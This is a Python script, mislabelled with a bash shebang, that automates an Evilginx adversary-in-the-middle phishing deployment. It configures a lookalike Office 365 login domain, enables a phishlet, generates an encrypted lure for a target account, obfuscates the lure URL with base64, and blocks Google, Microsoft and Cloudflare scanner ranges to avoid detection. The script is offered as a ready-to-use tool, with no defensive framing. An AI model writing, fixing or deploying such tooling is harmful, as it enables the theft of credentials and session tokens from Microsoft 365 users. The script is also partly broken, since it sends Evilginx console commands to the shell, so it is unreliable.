#!/bin/bash
# FIXED: ultimate_stealth_deploy.py - Error handling + Evilginx checks

import subprocess
import base64
import urllib.parse
from datetime import datetime
import os

DOMAIN = "login.office365-security.com"
PHISHLET = "office365"
USERNAME = "admin@target.com"

def run_cmd(cmd, capture=False):
    """Fixed: Always return string, never bool"""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        if capture:
            return result.stdout.strip()
        return result.returncode == 0
    except:
        return "" if capture else False

print("🚀 Ultimate Stealth Deploy (FIXED)")
print()

# 1. CHECK EVILNGIX FIRST
print("🔍 Checking Evilginx...")
if not run_cmd("evilginx -h"):
    print("❌ ERROR: Evilginx not running! Start with: evilginx")
    exit(1)

# 2. BOT BLOCKS (Safe)
BLOCKLIST = ["66.249.64.0/18", "20.41.0.0/16", "104.16.0.0/12"]
for ip in BLOCKLIST:
    run_cmd(f"iptables -A INPUT -s {ip} -j DROP")
print(f"✅ {len(BLOCKLIST)} bots blocked")

# 3. EVILNGIX DEPLOY (Step-by-step)
print("⚙️  Evilginx setup...")
run_cmd(f"config domain {DOMAIN}")
run_cmd(f"phishlets hostname login {DOMAIN}")
run_cmd(f"phishlets enable {PHISHLET}")

# 4. FIXED LURE GENERATION
print("🔑 Creating lure...")
lure_cmd = f"lures create {PHISHLET} username='{USERNAME}' --encrypted"
lure_output = run_cmd(lure_cmd, True)

if not lure_output:
    print("❌ LURE FAILED. Run manually: lures create office365 username='admin@target.com' --encrypted")
    print("Then: lures get-url 0")
    exit(1)

# Extract HTTPS line SAFELY
lines = [line.strip() for line in lure_output.split('\n') if 'https' in line]
LURE = lines[0] if lines else ""
if not LURE:
    print("❌ No HTTPS URL found. Check phishlet.")
    exit(1)

print(f"✅ LURE: {LURE}")

# 5. SIMPLE ENCRYPTION (Python stdlib only)
BASE64_LURE = base64.b64encode(LURE.encode()).decode()

print("\n" + "="*50)
print("🎯 **COPY THIS - WORKS IMMEDIATELY:**")
print(f"🔒 {LURE}")
print(f"🔐 BASE64: https://{DOMAIN}/go/{BASE64_LURE}")
print("="*50)
print("📊 Monitor: tail -f /var/log/nginx/access.log")
